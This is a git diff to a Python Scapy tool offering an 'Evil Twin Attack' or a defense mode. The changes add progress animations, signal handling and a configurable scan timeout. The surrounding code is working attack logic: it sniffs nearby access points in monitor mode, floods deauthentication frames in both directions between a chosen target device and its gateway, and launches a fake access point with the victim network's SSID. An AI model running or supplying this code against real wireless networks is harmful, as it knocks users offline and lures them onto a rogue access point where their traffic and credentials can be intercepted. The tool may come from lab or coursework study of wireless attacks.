@@ -5,6 +5,12 @@ from threading import Thread
 import pandas
 import time
 import os
+from UI import *
+# avoid wraping everything in an exception 
+# (disabling Traceback on interrupt [Ctrl-c])
+import signal
+import sys
+signal.signal(signal.SIGINT, lambda x, y: sys.exit('\n'))
 
 import warnings
 
@@ -68,7 +74,7 @@ def change_channel():
 
 def for_ap(frame, interface):
     while True:
-        sendp(frame, iface=interface, count=100, inter=0.1)
+        sendp(frame, iface=interface, count=100, inter=0.1, verbose=0)
 
 
 def enable_monitor_mode(inter):
@@ -87,24 +93,32 @@ def evil_twin():
     # 12. Fake AP
     fake_ap_cmd = 'sudo gnome-terminal -- sh -c "python3 fakeAP.py ' + \
                   net['SSID'] + ' ' + str(net['Channel']) + ' ' + interface_internet + ' ' + interface_fake + ';"$SHELL'
-    print(fake_ap_cmd)
+    #print(fake_ap_cmd)
     os.system(fake_ap_cmd)
 
     # 13. User attack
     # Source: https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
     print('The target is: ', target_mac)
-    print('Attack!!! :)')
+    print('\nDo not close this window')
     frame1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
     frame2 = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
 
     deauth1 = threading.Thread(target=for_ap, args=(frame1, interface))
     deauth2 = threading.Thread(target=for_ap, args=(frame2, interface))
-
+    deauth1.setDaemon(True)
+    deauth2.setDaemon(True)
+    # Loading Circle
+    msg = "Operation Deauthentication Attack..."
+    loading = threading.Thread(target = loadingCircle, args = (msg,))
+    loading.setDaemon(True)
+    loading.start()
+    # END Loading Circle
     deauth1.start()
     deauth2.start()
     deauth1.join()
     deauth2.join()
-
+    loading.join()
+    
     # 14. Disable monitor mode and cancel interface division
     disable_monitor_mode(interface)
     disable_monitor_mode(interface_fake)
@@ -113,9 +127,11 @@ def evil_twin():
 
 
 if __name__ == "__main__":
-    print('1. Evil Twin Attack')
-    print('2. Defense')
-    val = input("Please Choose Action: ")
+    printWelcome()
+    print('>  Available Actions:')
+    print('>  1. Evil Twin Attack')
+    print('>  2. Defense')
+    val = input(">  Please Choose Action: ")
     while True:
         try:
             choose = int(val)
@@ -133,10 +149,10 @@ if __name__ == "__main__":
     if action == 'Attack':
     # 1. Get network interface card names & print
         interfaces = os.listdir('/sys/class/net/')
-        print("Interfaces:")
+        print("\nInterfaces:")
         for (i, item) in enumerate(interfaces, start=1):
             print("   " + str(i) + ". " + item)
-        val = input("Please Choose Interface for Dividing (Optional), otherwise enter -1: ")
+        val = input("\nPlease Choose Interface for Dividing (Optional), otherwise enter -1 (ABORT: sudo iw dev mon0 del): ")
 
     # 2. Choose card interface to split for 2 different interfaces
         flag_div = True
@@ -156,9 +172,10 @@ if __name__ == "__main__":
                 val = input("Please Choose Again: ")
 
     interfaces = os.listdir('/sys/class/net/')
-    print("Interfaces:")
+    print("\nInterfaces:")
     for (i, item) in enumerate(interfaces, start=1):
         print("   " + str(i) + ". " + item)
+    print()
     val = input(f"Please Choose Interface for {action}: ")
 
     # 2.1 Choose card interface to attack/defense with
@@ -202,15 +219,28 @@ if __name__ == "__main__":
     if action == 'Attack':
         enable_monitor_mode(interface_fake)
 
-    print('Looking for networks.....')
+    # 4.a prepare sniffing args
+    sniff_timeout = input(f"\nPlease enter scanning timeout (in seconds): ")
+    # Get timeout input
+    while True:
+        try:
+            sniff_timeout = int(sniff_timeout)
+            break
+        except:
+            sniff_timeout = input("Please Choose Again: ")
+    print('\nLooking for networks.....')    
+    # Loading Animation
+    loading = threading.Thread(target = loadingProgressBar, args = (sniff_timeout-1, "Scanning", "Complete"))
+    loading.start()
 
-    # 4. Start the channel changer
+    # 4.b Start the channel changer
     channel_changer = Thread(target=change_channel)
     channel_changer.daemon = True
     channel_changer.start()
 
     # 5. Start sniffing (Synchronous process)
-    sniff(prn=callback, iface=interface, timeout=10)
+    sniff(prn=callback, iface=interface, timeout=sniff_timeout)
+
 
     # 6. Stop changing channel thread
     stop_threads = True
@@ -222,6 +252,7 @@ if __name__ == "__main__":
 
     # 8. Choose the AP to attack/defense
     print(networks.iloc[:, [0, 1]])
+    #print(tableize(networks))
     net_val = input(f"\nPlease enter the index of the AP you want to {action}: ")
     while True:
         try:
